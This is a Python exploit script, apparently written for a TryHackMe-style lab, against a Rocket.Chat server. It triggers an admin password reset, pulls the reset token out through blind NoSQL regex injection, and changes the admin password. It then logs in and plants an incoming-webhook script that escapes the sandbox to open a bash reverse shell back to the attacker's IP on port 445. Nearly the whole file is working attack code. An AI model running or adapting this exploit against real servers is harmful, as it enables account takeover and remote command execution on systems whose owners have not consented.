#!/usr/bin/python3

import requests
import string
import time
import hashlib
import json

adminmail = "admin@rocket.thm"
target = "http://chat.rocket.thm"
my_ip = "10.11.41.146"  #change IP
port = 445

def forgotpassword(email,url):
    payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
    headers={'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
    print("[+] Password Reset Email Sent")

def resettoken(url):
    u = url+"/api/v1/method.callAnon/getPasswordPolicy"
    headers={'content-type': 'application/json'}
    token = ""

    num = list(range(0,10))
    string_ints = [str(int) for int in num]
    characters = list(string.ascii_uppercase + string.ascii_lowercase) + list('-')+list('_') + string_ints

    while len(token)!= 43:
        for c in characters:
            payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            time.sleep(0.5)
            if 'Meteor.Error' not in r.text:
                token += c
                print(f"Got: {token}")

    print(f"[+] Got token : {token}")
    return token

def changingpassword(url,token):
    payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
    headers={'content-type': 'application/json'}
    r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
    if "error" in r.text:
        exit("[-] Wrong token")
    print("[+] Password was changed !")

def rce(url,my_ip,port):
    # Authenticating
    sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
    payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+"admin@rocket.thm"+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
    headers={'content-type': 'application/json'}
    r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
    if "error" in r.text:
        exit("[-] Couldn't authenticate")
    data = json.loads(r.text)  
    data =(data['message'])
    userid = data[32:49]
    token = data[60:103]
    
    print("[+] Succesfully authenticated as administrator")

    # Creating Integration
    payload = '{"enabled":true,"channel":"#general","username":"admin",'
    payload += '"name":"wow","alias":"","avatarUrl":"","emoji":"",'
    payload += '"scriptEnabled":true,"script":'
    payload += '"class Script {\\n\\n  process_incoming_request({ request }) {\\n\\n\\tconst require = console.log.constructor(\'return process.mainModule.require\')();\\n\\tconst { exec } = require(\'child_process\');\\n\\texec(\'bash -c \\\"bash -i >& /dev/tcp/' + str(my_ip) + '/' + str(port) + ' 0>&1\\\"\');\\n\\n\\n    return {\\n      error: {\\n        success: true,\\n        message: \\\"lol\\\"\\n      }\\n    };\\n  }\\n}",'
    payload += '"type":"webhook-incoming"}'

    cookies = {'rc_uid': userid,'rc_token': token}
    headers = {'X-User-Id': userid,'X-Auth-Token': token}
    r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
    data = r.json()
    _id = data["integration"]["_id"]
    token = data["integration"]["token"]

    # Triggering RCE
    u = url + '/hooks/' + _id + '/' +token
    r = requests.get(u)
    print(r.text)

############################################################

print("[1] change admin password and rce")
print("[2] already changed admin password, do rce only")
c = input("Your Choice: ")
if c == "1":
    # Getting Low Priv user
    print(f"[+] Resetting admin password")
    ## Sending Reset Mail
    forgotpassword("admin@rocket.thm",target)

    ## Getting reset token through blind nosql injection
    token = resettoken(target)

    ## Changing Password
    changingpassword(target,token)

    ## Authenticating and triggering rce
    input("start nc and press enter")
    rce(target,my_ip,port)
else:
    ## Authenticating and triggering rce
    input("start nc and press enter")
    rce(target,my_ip,port)

